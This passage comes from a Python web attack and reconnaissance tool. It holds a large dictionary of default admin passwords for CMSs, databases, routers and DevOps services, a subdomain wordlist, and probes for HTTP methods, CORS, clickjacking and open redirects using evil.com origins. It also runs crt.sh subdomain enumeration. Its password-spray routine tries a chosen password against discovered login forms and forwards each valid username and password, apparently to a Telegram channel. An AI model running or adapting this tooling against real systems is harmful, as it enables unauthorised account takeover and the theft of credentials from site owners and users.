    "Joomla":          [("admin","admin"),("admin","password"),("admin","123456"),("admin","joomla"),("administrator","joomla")],
    "Drupal":          [("admin","admin"),("admin","password"),("admin","drupal"),("admin","drupal123")],
    "Magento":         [("admin","admin123"),("admin","password"),("admin","admin@123"),("admin","magento")],
    "OpenCart":        [("admin","admin"),("admin","password"),("admin","opencart")],
    "PrestaShop":      [("admin@admin.com","admin"),("admin","admin"),("admin","prestashop")],
    "phpMyAdmin":      [("root",""),("root","root"),("root","password"),("root","mysql"),("admin","admin"),("pma","pma")],
    "Jenkins":         [("admin","admin"),("admin","password"),("jenkins","jenkins"),("admin","jenkins")],
    "GitLab":          [("root","5iveL!fe"),("root","password"),("admin","admin"),("root","root")],
    "Jira":            [("admin","admin"),("admin","password"),("admin","jira"),("admin","admin123")],
    "Confluence":      [("admin","admin"),("admin","password"),("admin","confluence")],
    "Grafana":         [("admin","admin"),("admin","password"),("admin","grafana")],
    "Kibana":          [("elastic","changeme"),("kibana","changeme"),("admin","admin")],
    "Elasticsearch":   [("elastic","changeme"),("admin","admin")],
    "Portainer":       [("admin","tryportainer"),("admin","password"),("admin","admin")],
    "Rancher":         [("admin","admin"),("admin","password"),("admin","rancher")],
    "Vault":           [("root","root"),("admin","admin")],
    "Consul":          [("admin","admin")],
    "Minio":           [("minioadmin","minioadmin"),("admin","password"),("minio","minio123")],
    "Redis":           [("",""),("admin","")],
    "MongoDB":         [("admin","admin"),("root","root"),("mongo","mongo")],
    "MySQL":           [("root",""),("root","root"),("root","mysql"),("root","password"),("admin","admin")],
    "PostgreSQL":      [("postgres","postgres"),("postgres","password"),("admin","admin")],
    "CouchDB":         [("admin","admin"),("admin","couchdb"),("couchdb","couchdb")],
    "RabbitMQ":        [("guest","guest"),("admin","admin"),("rabbitmq","rabbitmq")],
    "Kafka":           [("admin","admin")],
    "Zookeeper":       [("admin","admin")],
    "Tomcat":          [("admin","admin"),("tomcat","tomcat"),("admin","password"),("tomcat","password"),("manager","manager"),("admin","tomcat")],
    "WebLogic":        [("weblogic","weblogic"),("weblogic","welcome1"),("weblogic","Oracle123"),("admin","admin")],
    "JBoss":           [("admin","admin"),("jboss","jboss")],
    "GlassFish":       [("admin","admin"),("admin","adminadmin")],
    "WildFly":         [("admin","admin"),("wildfly","wildfly")],
    "IIS":             [("administrator","password"),("admin","admin")],
    "Apache":          [("admin","admin")],
    "Nginx":           [("admin","admin")],
    "FortiGate":       [("admin",""),("admin","admin")],
    "Cisco":           [("admin","admin"),("cisco","cisco"),("admin","password")],
    "Juniper":         [("root",""),("admin","admin")],
    "Palo Alto":       [("admin","admin")],
    "Check Point":     [("admin","admin")],
    "Netgear":         [("admin","password"),("admin","admin"),("admin","1234")],
    "D-Link":          [("admin","admin"),("admin",""),("admin","password")],
    "Linksys":         [("admin","admin"),("admin","password"),("admin","1234")],
    "TP-Link":         [("admin","admin"),("admin","password"),("admin","")],
    "Asus":            [("admin","admin"),("admin","password")],
    "MikroTik":        [("admin",""),("admin","admin")],
    "Ubiquiti":        [("ubnt","ubnt"),("admin","admin")],
    "pfSense":         [("admin","pfsense"),("admin","admin")],
    "OpenWRT":         [("root",""),("admin","admin")],
    "CPANEL":          [("admin","admin"),("cpanel","cpanel")],
    "WHM":             [("root","root"),("admin","admin")],
    "Plesk":           [("admin","setup"),("admin","admin")],
    "DirectAdmin":     [("admin","admin")],
    "Webmin":          [("root","root"),("admin","admin")],
    "Nagios":          [("nagiosadmin","nagiosadmin"),("admin","admin")],
    "Zabbix":          [("Admin","zabbix"),("admin","admin"),("guest","")],
    "PRTG":            [("prtgadmin","prtgadmin"),("admin","admin")],
    "Cacti":           [("admin","admin")],
    "Observium":       [("admin","admin")],
    "LibreNMS":        [("admin","admin")],
    "Netdata":         [("admin","admin")],
    "Graylog":         [("admin","admin")],
    "Splunk":          [("admin","changeme"),("admin","admin")],
    "Superset":        [("admin","general"),("admin","admin")],
    "Metabase":        [("admin@admin.com","admin"),("admin","admin")],
    "Airflow":         [("airflow","airflow"),("admin","admin")],
    "Jupyter":         [("",""),("admin","admin")],
    "RStudio":         [("rstudio","rstudio"),("admin","admin")],
    "Shiny":           [("admin","admin")],
    "SonarQube":       [("admin","admin"),("admin","password")],
    "Nexus":           [("admin","admin123"),("admin","password")],
    "Artifactory":     [("admin","password"),("admin","admin")],
    "Bamboo":          [("admin","admin")],
    "Bitbucket":       [("admin","admin")],
    "TeamCity":        [("admin","admin")],
    "Gerrit":          [("admin","admin")],
    "Mattermost":      [("admin","admin"),("user","user")],
    "Rocket.Chat":     [("admin","admin")],
    "Openfire":        [("admin","admin")],
    "Ejabberd":        [("admin","password"),("admin","admin")],
    "vBulletin":       [("admin","admin"),("admin","password")],
    "phpBB":           [("admin","admin"),("admin","password")],
    "SMF":             [("admin","admin"),("admin","password")],
    "Discourse":       [("admin","admin"),("admin","password")],
    "MyBB":            [("admin","admin")],
    "IP.Board":        [("admin","admin")],
    "XenForo":         [("admin","admin")],
    "Vanilla":         [("admin","admin")],
    "Flarum":          [("admin","password"),("admin","admin")],
    "NodeBB":          [("admin","admin")],
    "Oxwall":          [("admin","admin")],
    "e107":            [("admin","admin")],
    "Nucleus":         [("admin","nucleus")],
    "Serendipity":     [("admin","admin")],
    "Textpattern":     [("admin","admin")],
    "Dotclear":        [("admin","admin")],
    "SilverStripe":    [("admin@example.com","admin"),("admin","admin")],
    "Concrete5":       [("admin","admin")],
    "CraftCMS":        [("admin","password"),("admin","admin")],
    "Ghost":           [("admin@blog.com","admin")],
    "Strapi":          [("admin@admin.com","Admin1234!")],
    "Directus":        [("admin@example.com","password")],
    "Keystone":        [("admin@admin.com","password")],
    "Payload":         [("admin@example.com","test")],
    "Contentful":      [("admin","admin")],
    "Sanity":          [("admin","admin")],
    "Wagtail":         [("admin","changeme"),("admin","admin")],
    "Django Admin":    [("admin","admin"),("admin","password")],
    "Flask Admin":     [("admin","admin")],
    "Rails Admin":     [("admin@admin.com","admin")],
    "Laravel Admin":   [("admin@admin.com","admin"),("admin","admin")],
}

PROXY_LIST_BUILTIN = []

EXTENDED_SUBDOMAIN_WORDS = [
    "www2","www3","www4","www5","ww1","ww2",
    "mail4","mail5","mail6","mail7","mail8",
    "smtp4","smtp5","smtp6","smtp7",
    "pop4","pop5","imap3","imap4",
    "ftp2","ftp3","sftp2", "ftps2",
    "vpn6","vpn7","vpn8","vpn9","vpn10",
    "vpn-us","vpn-eu","vpn-asia","vpn-ap",
    "vpn-us1","vpn-us2","vpn-eu1","vpn-eu2",
    "remote3","remote4","remote5",
    "gateway2","gateway3",
    "proxy2","proxy3","proxy4",
    "lb2","lb3","lb4",
    "app2","app3","app4","app5","app6",
    "app-us","app-eu","app-asia",
    "api2","api3","api4","api5",
    "api-us","api-eu","api-asia",
    "api-v1","api-v2","api-v3",
    "api-internal","api-external",
    "api-private","api-public",
    "api-legacy","api-new","api-old",
    "dev3","dev4","dev5","dev6",
    "dev-us","dev-eu","dev-asia",
    "dev-01","dev-02","dev-03",
    "dev-john","dev-jane","dev-mike",
    "dev-feature1","dev-feature2",
    "staging3","staging4","staging5",
    "stg3","stg4","stg5",
    "stg-us","stg-eu","stg-asia",
    "preprod2","preprod3",
    "uat3","uat4","uat5",
    "qa3","qa4","qa5",
    "test4","test5","test6","test7",
    "testing2","testing3","testing4",
    "test-01","test-02","test-03",
    "alpha2","alpha3","beta3","beta4",
    "canary2","canary3",
    "feature1","feature2","feature3",
    "feature-us","feature-eu",
    "hotfix","hotfix2","hotfix3",
    "bugfix","bugfix2","bugfix3",
    "fix","fix2","fix3",
    "patch","patch2","patch3",
    "release","release2","release3",
    "release-candidate","rc","rc2","rc3",
    "preview2","preview3","preview4",
    "demo2","demo3","demo4","demo5",
    "sandbox3","sandbox4","sandbox5",
    "lab","lab2","lab3","labs","labs2",
    "poc","poc2","proof","proof-of-concept",
    "experiment","experiment2","experiments",
    "prototype","prototype2","prototypes",
    "pilot","pilot2","pilot3",
    "trial","trial2","trials",
    "eval","eval2","evaluate","evaluation",
    "benchmark","benchmark2",
    "performance","perf","perf2",
    "load","load2","loadtest","loadtesting",
    "stress","stress2","stresstest",
    "regression","regression2",
    "e2e","e2e2","integration2","integration3",
    "smoke","smoke2","smoketest",
    "acceptance","acceptance2",
    "contract","contract2",
    "functional","functional2",
    "system","sys2","sys3",
    "it","it2","it3","it4",
    "sit2","sit3","sit4",
    "ipe","ipe2","npe","npe2",
    "ops2","ops3","operations2",
    "devops2","devops3","sre2","sre3",
    "platform","platform2","platform3",
    "infra","infra2","infra3",
    "infrastructure","infrastructure2",
    "core2","core3","core4",
    "edge","edge2","edge3",
    "fog","fog2","mist","mist2",
    "internal2","internal3",
    "intranet2","intranet3",
    "extranet2","extranet3",
    "corp2","corp3","corporate",
    "hq2","hq3","headquarters2",
    "hub2","hub3","hub4",
    "central2","central3",
    "global","global2","global3",
    "regional","region","region2",
    "zone2","zone3","zone4",
    "us","us1","us2","us3","usa","usa1","usa2",
    "eu","eu1","eu2","eu3","europe","europe1",
    "asia","asia1","asia2","asia3","apac","apac1",
    "ap","ap1","ap2","ap3",
    "au","au1","au2","australia",
    "uk","uk1","uk2","gb","gb1","gb2",
    "de","de1","de2","germany","ger",
    "fr","fr1","fr2","france","fra",
    "nl","nl1","nl2","netherlands","ned",
    "sg","sg1","sg2","singapore","sin",
    "jp","jp1","jp2","japan","jpn",
    "in","in1","in2","india","ind",
    "ca","ca1","ca2","canada","can",
    "br","br1","br2","brazil","bra",
    "mx","mx1","mx2","mexico","mex",
    "za","za1","za2","south-africa","southafrica",
    "ae","ae1","ae2","uae","dubai",
    "east","east2","west","west2",
    "north","north2","south","south2",
    "central2","east-us","west-us",
    "east-eu","west-eu","east-asia","south-asia",
    "us-east","us-west","us-central","us-south",
    "eu-west","eu-central","eu-north","eu-south",
    "ap-east","ap-west","ap-south","ap-southeast",
    "nyc","nyc1","nyc2","nyc3",
    "sfo","sfo1","sfo2","sfo3",
    "lon","lon1","lon2","lon3",
    "ams","ams1","ams2","ams3",
    "fra","fra1","fra2","fra3",
    "sin","sin1","sin2","sin3",
    "tor","tor1","tor2","tor3",
    "blr","blr1","blr2","blr3",
    "syd","syd1","syd2","syd3",
    "nrt","nrt1","nrt2","nrt3",
    "bom","bom1","bom2","bom3",
    "mum","mum1","mum2","mum3",
    "del","del1","del2","del3",
    "sea","sea1","sea2","sea3",
    "chi","chi1","chi2","chi3",
    "dal","dal1","dal2","dal3",
    "mia","mia1","mia2","mia3",
    "lax","lax1","lax2","lax3",
    "dfw","dfw1","dfw2","dfw3",
    "bos","bos1","bos2","bos3",
    "atl","atl1","atl2","atl3",
    "slc","slc1","slc2","slc3",
    "pdx","pdx1","pdx2","pdx3",
    "den","den1","den2","den3",
    "hkn","hkn1","hkn2","hkn3",
    "tpe","tpe1","tpe2","tpe3",
    "icn","icn1","icn2","icn3",
    "kul","kul1","kul2","kul3",
    "bkk","bkk1","bkk2","bkk3",
    "jkt","jkt1","jkt2","jkt3",
    "mxp","mxp1","mxp2","mxp3",
    "cdg","cdg1","cdg2","cdg3",
    "mad","mad1","mad2","mad3",
    "bcn","bcn1","bcn2","bcn3",
    "vie","vie1","vie2","vie3",
    "zrh","zrh1","zrh2","zrh3",
    "cph","cph1","cph2","cph3",
    "sto","sto1","sto2","sto3",
    "hel","hel1","hel2","hel3",
    "osl","osl1","osl2","osl3",
    "waw","waw1","waw2","waw3",
    "prg","prg1","prg2","prg3",
    "bud","bud1","bud2","bud3",
    "buh","buh1","buh2","buh3",
    "sof","sof1","sof2","sof3",
    "ist","ist1","ist2","ist3",
    "mos","mos1","mos2","mos3",
    "dxb","dxb1","dxb2","dxb3",
    "jnb","jnb1","jnb2","jnb3",
    "lim","lim1","lim2","lim3",
    "bog","bog1","bog2","bog3",
    "scl","scl1","scl2","scl3",
    "gru","gru1","gru2","gru3",
    "ewr","ewr1","ewr2","ewr3",
    "iad","iad1","iad2","iad3",
    "ord","ord1","ord2","ord3",
    "msp","msp1","msp2","msp3",
    "clt","clt1","clt2","clt3",
    "ric","ric1","ric2","ric3",
    "pit","pit1","pit2","pit3",
    "cmh","cmh1","cmh2","cmh3",
    "hsv","hsv1","hsv2","hsv3",
    "rno","rno1","rno2","rno3",
    "phx","phx1","phx2","phx3",
    "mem","mem1","mem2","mem3",
    "ind","ind1","ind2","ind3",
    "buf","buf1","buf2","buf3",
    "mke","mke1","mke2","mke3",
    "okc","okc1","okc2","okc3",
    "tul","tul1","tul2","tul3",
    "sat","sat1","sat2","sat3",
    "aus","aus1","aus2","aus3",
    "hou","hou1","hou2","hou3",
    "mci","mci1","mci2","mci3",
    "stl","stl1","stl2","stl3",
    "cle","cle1","cle2","cle3",
    "dtw","dtw1","dtw2","dtw3",
    "lga","lga1","lga2","lga3",
    "jfk","jfk1","jfk2","jfk3",
]

ALL_PATHS_COMBINED = list(dict.fromkeys(
    ADMIN_PATHS + EXTENDED_ADMIN_PATHS_2 + BACKUP_PATHS_EXTRA +
    EXTENDED_BACKUP_PATHS_2 + API_PATHS + MORE_API_PATHS +
    GIT_EXPOSED_PATHS + REST_ENDPOINTS + MULTISITE_PATHS
))


                                                                                 
                                                  
                                                                                 

def _status_color(code):
    if code == 200:                       return GRN
    if code in (201, 202, 204):           return GRN
    if code in (301, 302, 303, 307, 308): return YLW
    if code == 401:                       return YLW
    if code == 403:                       return "\033[38;5;208m"
    if code in (404, 410):                return DIM
    if code in (429, 503, 509):           return RED
    if code >= 500:                       return RED
    return RST


def _colored_hit(url, code, size=-1, note=""):
    col = _status_color(code)
    sz  = f"{size}b" if size >= 0 else "?"
    tag = "FOUND" if code == 200 else str(code)
    print(f"  {col}[{tag}]{RST} {url:<55} {DIM}{sz}{RST}"
          + (f" {YLW}{note}{RST}" if note else ""))


def url_precheck(url, verbose=True):
    url = normalize(url)
    methods_to_try = ["HEAD", "GET"]
    for method in methods_to_try:
        try:
            if method == "HEAD":
                r = _sess().head(url, timeout=TIMEOUT,
                                 verify=VERIFY_SSL, allow_redirects=True)
            else:
                r = _get(url, timeout=TIMEOUT)
            if r is None:
                continue
            code = r.status_code
            col  = _status_color(code)
            if verbose:
                sz = len(r.content) if hasattr(r, 'content') else -1
                server = r.headers.get("Server","?")
                _info(f"Pre-check  [{col}{code}{RST}]  {url}"
                      f"  {DIM}server: {server}  size: {sz}b{RST}")
            if code < 500:
                return True, url, r
        except Exception as e:
            if verbose:
                _err(f"Pre-check failed: {e}")
            continue
    return False, url, None


def show_target_info(url):
    _banner()
    ok, url, r = url_precheck(url)
    if not ok:
        _err(f"Target unreachable: {url}")
        return {}
    base   = normalize_base(url)
    parsed = urlparse(base)
    host   = parsed.hostname or base

    info = {"url": base, "host": host}
    print()
    try:
        ip = socket.gethostbyname(host)
        info["ip"] = ip
        _found(f"Resolved IP   : {ip}")
    except Exception:
        _warn("Could not resolve IP")

    if r:
        server = r.headers.get("Server","?")
        pw     = r.headers.get("X-Powered-By","?")
        info["server"]       = server
        info["x_powered_by"] = pw
        _found(f"Server        : {server}")
        if pw != "?":
            _found(f"X-Powered-By  : {pw}")
        code = r.status_code
        col  = _status_color(code)
        _found(f"HTTP Status   : {col}{code}{RST}")
        body   = r.text if hasattr(r, 'text') else ""
        hdr_s  = str(dict(r.headers)).lower()
        for tech, sigs in TECHNOLOGY_SIGS.items():
            for sig in sigs:
                if sig.lower() in body.lower() or sig.lower() in hdr_s:
                    info.setdefault("tech",[]).append(tech)
                    _found(f"Technology    : {tech}")
                    break
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in hdr_s or sig.lower() in body.lower():
                    info["waf"] = waf_name
                    _warn(f"WAF detected  : {waf_name}")
                    break
    ssl_r = ssl_info_probe(base)
    if not ssl_r.get("error"):
        info["ssl_proto"]  = ssl_r.get("protocol","?")
        info["ssl_issuer"] = ssl_r.get("issuer","?")
        info["ssl_cn"]     = ssl_r.get("cn","?")
        info["ssl_expiry"] = ssl_r.get("not_after","?")
        _found(f"SSL Protocol  : {ssl_r.get('protocol','?')}")
        _found(f"SSL Issuer    : {ssl_r.get('issuer','?')}")
        _found(f"SSL Expires   : {ssl_r.get('not_after','?')}")
    print()
    return info


def show_target_info_fn(target):
    _banner()
    if not target:
        target = _ask("target-url").strip()
    if not target:
        return
    show_target_info(target)
    _pause()


                                                                                 
                    
                                                                                 

def http_methods_probe(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"HTTP Method Probe → {base}")
    results = []
    test_paths = ["/", "/admin", "/api", "/upload", "/config",
                  "/delete", "/user", "/users", "/update", "/test"]

    for path in test_paths[:5]:
        full = base + path
        for method in HTTP_METHODS_TEST:
            try:
                r = _sess().request(method, full, timeout=TIMEOUT,
                                    verify=VERIFY_SSL, allow_redirects=False)
                if r and r.status_code not in (405, 501, 404, 400):
                    col  = _status_color(r.status_code)
                    note = ""
                    if method in ("PUT","DELETE","TRACE","CONNECT"):
                        note = "RISKY"
                        _vuln(f"Dangerous method {method} allowed: {full}"
                              f" [{r.status_code}]")
                        _add_finding(
                            "HIGH",
                            f"Dangerous HTTP Method: {method}",
                            full,
                            f"{method} returned {r.status_code}",
                            f"Method: {method}  Path: {path}",
                            "Disable unused HTTP methods in server config.",
                            "HTTP Methods"
                        )
                    elif method == "OPTIONS":
                        allow = r.headers.get("Allow","")
                        note  = f"Allow: {allow[:40]}"
                        _found(f"OPTIONS {full} → Allow: {allow[:40]}")
                    if r.status_code not in (404, 405, 501):
                        results.append({
                            "method":  method,
                            "path":    full,
                            "status":  r.status_code,
                            "allowed": True,
                            "note":    note,
                        })
                    print(f"  {col}[{r.status_code}]{RST} {method:<8} {path}")
            except Exception:
                pass
            _jitter()

    if results:
        dangerous = [r for r in results if r["method"]
                     in ("PUT","DELETE","TRACE","CONNECT")]
        _found_box("HTTP METHODS", base,
                   f"Dangerous: {len(dangerous)}/{len(results)}", found=True)
    else:
        _clean("No dangerous methods found")
        _found_box("HTTP METHODS", base, "No dangerous methods found", found=False)

    _result_box("HTTP METHOD PROBE",[
        f"{_status_color(r['status'])}"
        f"[{r['status']}]{RST} {r['method']:<8} {r['path']}"
        for r in results[:20]
    ] or [f"{GRN}No risky methods exposed{RST}"])
    _pause()
    return results


                                                                                 
                      
                                                                                 

def cors_full_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"CORS Audit → {base}")
    results = []

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        f"https://{urlparse(base).hostname}.evil.com",
        f"https://evil.{urlparse(base).hostname}",
        "https://notevil.com",
        "http://evil.com",
        "file://",
        base + ".evil.com",
    ]
    check_paths = ["/", "/api", "/api/v1", "/api/v1/users",
                   "/api/v1/me", "/graphql", "/auth", "/login"]

    for path in check_paths[:5]:
        full = base + path
        for origin in test_origins:
            try:
                r = _sess().get(
                    full,
                    headers={"Origin": origin},
                    timeout=TIMEOUT,
                    verify=VERIFY_SSL,
                    allow_redirects=False,
                )
                if not r:
                    continue
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")

                if acao == "*":
                    _vuln(f"CORS wildcard: {full}  ACAO=*")
                    results.append({"url": full, "origin": origin,
                                    "type": "wildcard", "acao": acao})
                    _add_finding(
                        "MEDIUM","CORS Wildcard",full,
                        "ACAO: * allows any origin to read responses",
                        f"ACAO: {acao}",
                        "Restrict ACAO to specific trusted origins.","CORS"
                    )
                elif acao == origin:
                    finding_type = "arbitrary_origin"
                    sev = "HIGH"
                    if acac.lower() == "true":
                        finding_type = "arbitrary_origin_with_credentials"
                        sev = "CRITICAL"
                        _vuln(f"CORS arbitrary origin + credentials: "
                              f"{full}  origin={origin}")
                    else:
                        _vuln(f"CORS arbitrary origin reflected: "
                              f"{full}  origin={origin}")
                    results.append({
                        "url":    full,
                        "origin": origin,
                        "type":   finding_type,
                        "acao":   acao,
                        "acac":   acac,
                    })
                    _add_finding(
                        sev,
                        f"CORS Misconfiguration — {finding_type.replace('_',' ').title()}",
                        full,
                        f"Origin {origin} was reflected in ACAO header",
                        f"Origin: {origin}  ACAO: {acao}  ACAC: {acac}",
                        "Whitelist specific trusted origins in CORS config.",
                        "CORS"
                    )
                elif acao == "null" and origin == "null":
                    _vuln(f"CORS null origin: {full}")
                    results.append({"url": full, "origin": "null",
                                    "type": "null_origin", "acao": acao})
                    _add_finding(
                        "HIGH","CORS Null Origin",full,
                        "null origin accepted — exploitable via sandboxed iframe",
                        "ACAO: null",
                        "Reject null origin in CORS config.","CORS"
                    )
            except Exception:
                pass
            _jitter()

    if results:
        detail = "\n".join(
            f"[{r['type']}] {r['url'][:50]}"
            for r in results[:5]
        )
        _found_box("CORS", base, detail, found=True)
    else:
        _clean("No CORS misconfigurations found")
        _found_box("CORS", base, "No CORS issues found", found=False)

    _result_box("CORS AUDIT",[
        f"{RED if 'cred' in r.get('type','') else YLW}"
        f"[{r['type'].upper()}]{RST} {r['url'][:50]}"
        for r in results[:15]
    ] or [f"{GRN}No CORS misconfigurations{RST}"])
    _pause()
    return results


                                                                                 
                     
                                                                                 

def clickjacking_check(target):
    _banner()
    ok_, url, r = check_host(target)
    if not ok_:
        _pause()
        return {}
    base   = normalize_base(url)
    _info(f"Clickjacking Check → {base}")
    result = {"url": base, "vulnerable": False, "details": []}

    check_pages = ["/", "/login", "/admin", "/dashboard",
                   "/settings", "/account", "/profile", "/checkout",
                   "/payment", "/transfer", "/change-password"]

    for path in check_pages:
        full = base + path
        try:
            r2 = _get(full, timeout=TIMEOUT)
            if not r2:
                continue
            xfo = r2.headers.get("X-Frame-Options","")
            csp = r2.headers.get("Content-Security-Policy","")
            has_xfo = bool(xfo)
            has_csp_fa = "frame-ancestors" in csp.lower()

            if not has_xfo and not has_csp_fa:
                result["vulnerable"] = True
                result["details"].append({
                    "path":  full,
                    "xfo":   xfo or "MISSING",
                    "csp":   csp[:80] if csp else "MISSING",
                })
                _vuln(f"Clickjacking: {full}  XFO=MISSING  CSP-frame=MISSING")
                _add_finding(
                    "MEDIUM","Clickjacking Vulnerability",full,
                    "Page can be embedded in iframe — no X-Frame-Options or CSP frame-ancestors",
                    f"XFO: {xfo or 'MISSING'}  CSP: {csp[:80] if csp else 'MISSING'}",
                    "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'.",
                    "Clickjacking"
                )
            elif has_xfo:
                _found(f"X-Frame-Options: {xfo}  ({path})")
            elif has_csp_fa:
                fa = re.search(r'frame-ancestors\s+[^;]+', csp, re.I)
                _found(f"CSP frame-ancestors: {fa.group(0) if fa else 'set'}  ({path})")
        except Exception:
            pass

    if result["vulnerable"]:
        detail = "\n".join(d["path"] for d in result["details"][:5])
        _found_box("CLICKJACKING", base, detail, found=True)
    else:
        _clean("No clickjacking vulnerability found")
        _found_box("CLICKJACKING", base, "Protected", found=False)

    _result_box("CLICKJACKING CHECK",[
        f"{RED}[VULN]{RST} {d['path']}"
        for d in result["details"][:15]
    ] or [f"{GRN}All pages protected{RST}"])
    _pause()
    return result


                                                                                 
                          
                                                                                 

def open_redirect_full_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Open Redirect Scanner → {base}")
    results = []
    redirect_params = [
        "url","to","redirect","redirect_url","redirect_uri",
        "next","return","return_url","returnUrl","return_to",
        "goto","go","dest","destination","forward","out",
        "target","link","href","src","continue","after",
        "r","u","l","redir","ref","referrer","from",
        "login_redirect","callback","callbackUrl","cb",
        "success_url","cancel_url","failure_url","error_url",
        "success","cancel","failure","back","backurl",
        "RelayState","SAMLRequest","state","nonce",
        "view","page","q","s","search",
    ]
    canary = "https://evil.com"

    for param in redirect_params:
        for payload in OPEN_REDIRECT_PAYLOADS[:6]:
            test_url = f"{base}/?{param}={quote(payload)}"
            try:
                r = _sess().get(
                    test_url,
                    timeout=TIMEOUT,
                    verify=VERIFY_SSL,
                    allow_redirects=False,
                )
                if not r:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    location = r.headers.get("Location","")
                    parsed_loc = urlparse(location)
                    parsed_pay = urlparse(payload)
                    if (parsed_pay.netloc and
                            parsed_pay.netloc in location and
                            "evil.com" in location.lower()):
                        _vuln(f"Open Redirect: {param}={payload[:40]}"
                              f" → {location[:60]}")
                        results.append({
                            "url":      test_url,
                            "param":    param,
                            "payload":  payload,
                            "location": location,
                            "status":   r.status_code,
                        })
                        _add_finding(
                            "HIGH","Open Redirect",test_url,
                            f"Parameter {param} redirects to attacker-controlled URL",
                            f"Location: {location[:80]}",
                            "Validate redirect destinations against an allowlist.",
                            "Open Redirect"
                        )
                        break
                body_lower = r.text.lower() if hasattr(r,"text") else ""
                if "evil.com" in body_lower and r.status_code == 200:
                    _warn(f"Possible client-side redirect: {param}={payload[:40]}")
            except Exception:
                pass
            _jitter()

    if results:
        detail = "\n".join(
            f"[{r['param']}] → {r['location'][:50]}"
            for r in results[:5]
        )
        _found_box("OPEN REDIRECT", base, detail, found=True)
    else:
        _clean("No open redirects found")
        _found_box("OPEN REDIRECT", base, "No open redirects", found=False)

    _result_box("OPEN REDIRECT",[
        f"{RED}[VULN]{RST} {r['param']}={r['payload'][:30]}"
        f" → {r['location'][:40]}"
        for r in results[:15]
    ] or [f"{GRN}No open redirects found{RST}"])
    _pause()
    return results


                                                                                 
                                            
                                                                                 

def crtsh_enum(domain):
    found = []
    try:
        domain_clean = domain.lstrip("*.").strip()
        r = _get(
            f"https://crt.sh/?q=%25.{domain_clean}&output=json",
            timeout=15,
        )
        if not r or not r.ok:
            return found
        data = json.loads(r.text)
        seen = set()
        for entry in data:
            for name_type in ("common_name","name_value"):
                names = entry.get(name_type,"").split("\n")
                for name in names:
                    name = name.strip().lstrip("*.")
                    if name and domain_clean in name and name not in seen:
                        seen.add(name)
                        found.append(name)
    except Exception:
        pass
    return sorted(set(found))


def crtsh_enum_fn(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base   = normalize_base(url)
    host   = urlparse(base).hostname or base
    parts  = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    _info(f"crt.sh Subdomain Enum → {domain}")
    subs   = crtsh_enum(domain)
    if not subs:
        _warn("No results from crt.sh or request blocked")
        subs = []

    verified = []
    for sub in subs[:200]:
        try:
            ip = socket.gethostbyname(sub)
            verified.append({"fqdn": sub, "ip": ip})
            _found(f"{sub:<55} {DIM}{ip}{RST}")
        except Exception:
            pass

    if verified:
        _found_box("CERT TRANSPARENCY SUBS", domain,
                   "\n".join(v["fqdn"] for v in verified[:10]), found=True)
        _add_finding(
            "INFO","Subdomains via crt.sh",domain,
            f"Found {len(verified)} live subdomains via cert transparency",
            "\n".join(v["fqdn"] for v in verified[:10]),
            "Review exposed subdomains for dangling/takeover risks.",
            "Recon"
        )
    else:
        _clean("No live subdomains found via crt.sh")
        _found_box("CERT TRANSPARENCY SUBS", domain,
                   "No live subdomains found", found=False)

    _result_box("CERT TRANSPARENCY",[
        f"{GRN}{v['fqdn']}{RST}  {DIM}{v['ip']}{RST}"
        for v in verified[:30]
    ] or [f"{DIM}No results{RST}"])
    _pause()
    return verified


                                                                                 
                                                              
                                                                                 

def smart_password_spray(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base     = normalize_base(url)
    _info(f"Password Spray → {base}")
    hits     = []
    userlist = _ask("username-list file [blank=use built-in]").strip()
    passlist = _ask("password to spray [blank=Password1]").strip() or "Password1"

    if userlist and os.path.exists(userlist):
        with open(userlist, "r", errors="ignore") as fh:
            users = [l.strip() for l in fh if l.strip()]
    else:
        users = [
            "admin","administrator","user","support","test","info",
            "webmaster","manager","root","guest","demo","operator",
        ]

    login_paths = ["/login", "/wp-login.php", "/admin/login",
                   "/auth/login", "/signin", "/api/v1/auth/login",
                   "/api/v1/login", "/api/login", "/users/sign_in",
                   "/account/login", "/member/login", "/portal/login"]

    login_url = None
    for path in login_paths:
        try:
            r = _get(base + path, timeout=TIMEOUT)
            if r and r.status_code in (200, 302):
                login_url = base + path
                _found(f"Login form: {login_url}")
                break
        except Exception:
            pass

    if not login_url:
        _warn("No login endpoint found — using /login")
        login_url = base + "/login"

    _info(f"Spraying {len(users)} accounts with: {passlist}")
    _warn("Using 3s inter-request delay to avoid lockout")

    for idx, username in enumerate(users):
        for ufield in LOGIN_FORM_FIELDS["username_fields"][:3]:
            for pfield in LOGIN_FORM_FIELDS["password_fields"][:3]:
                try:
                    r = _post(
                        login_url,
                        data={ufield: username, pfield: passlist},
                        allow_redirects=True,
                        timeout=TIMEOUT,
                    )
                    if not r:
                        continue
                    body_lower = r.text.lower()
                    fail_sigs  = [
                        "invalid","incorrect","wrong","failed","error",
                        "unauthorized","bad credentials","invalid password",
                        "login failed","auth failed","access denied",
                    ]
                    success_sigs = [
                        "dashboard","welcome","logout","sign out",
                        "profile","account","home","main","token",
                    ]
                    if (r.status_code in (200,302) and
                            any(s in body_lower for s in success_sigs) and
                            not any(s in body_lower for s in fail_sigs)):
                        hits.append({
                            "username": username,
                            "password": passlist,
                            "url":      login_url,
                            "status":   r.status_code,
                        })
                        _vuln(f"SPRAY HIT: {username}:{passlist}  → {login_url}")
                        _add_finding(
                            "CRITICAL","Password Spray — Valid Credential",login_url,
                            f"Username {username} authenticated with sprayed password",
                            f"{username}:{passlist}",
                            "Enforce MFA. Implement account lockout policy.",
                            "Auth"
                        )
                        _tg_send_result(
                            "SPRAY HIT", login_url,
                            f"User: {username}  Pass: {passlist}",
                            CURRENT_USER
                        )
                        break
